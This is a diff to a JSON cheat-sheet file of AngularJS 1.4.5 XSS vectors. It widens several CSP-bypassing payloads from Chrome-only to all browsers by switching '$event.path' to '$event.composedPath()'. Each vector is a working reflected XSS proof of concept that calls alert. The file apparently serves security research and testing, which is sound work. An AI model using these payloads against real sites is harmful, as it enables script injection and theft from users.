@@ -410,7 +410,7 @@
         "csp": false
     },
     {
-        "versionRange": "All versions (Chrome)",
+        "versionRange": "All versions (all browsers)",
         "version": "1.4.5",
         "authors": [
             {
@@ -419,13 +419,13 @@
                 "twitterUrl": "https:\/\/twitter.com\/garethheyes"
             }
         ],
-        "vector": "<input autofocus ng-focus=\"$event.path|orderBy:'[].constructor.from([1],alert)'\">",
+        "vector": "<input autofocus ng-focus=\"$event.composedPath()|orderBy:'[].constructor.from([1],alert)'\">",
         "hash": "",
         "type": "reflected",
         "csp": true
     },
     {
-        "versionRange": "All versions (Chrome) shorter",
+        "versionRange": "All versions (all browsers) shorter",
         "version": "1.4.5",
         "authors": [
             {
@@ -434,7 +434,7 @@
                 "twitterUrl": "https:\/\/twitter.com\/garethheyes"
             }
         ],
-        "vector": "<input id=x ng-focus=$event.path|orderBy:'(z=alert)(1)'>",
+        "vector": "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>",
         "hash": "#x",
         "type": "reflected",
         "csp": true
@@ -470,7 +470,7 @@
         "csp": true
     },
     {
-        "versionRange": "All versions (Chrome) shorter via oncut",
+        "versionRange": "All versions (all browsers) shorter via oncut",
         "version": "1.4.5",
         "authors": [
             {
@@ -479,7 +479,7 @@
                 "twitterUrl": "https:\/\/twitter.com\/gadhiyasavan"
             }
         ],
-        "vector": "<input ng-cut=$event.path|orderBy:'(y=alert)(1)'>",
+        "vector": "<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>",
         "type": "reflected",
         "csp": true,
         "browsers": [
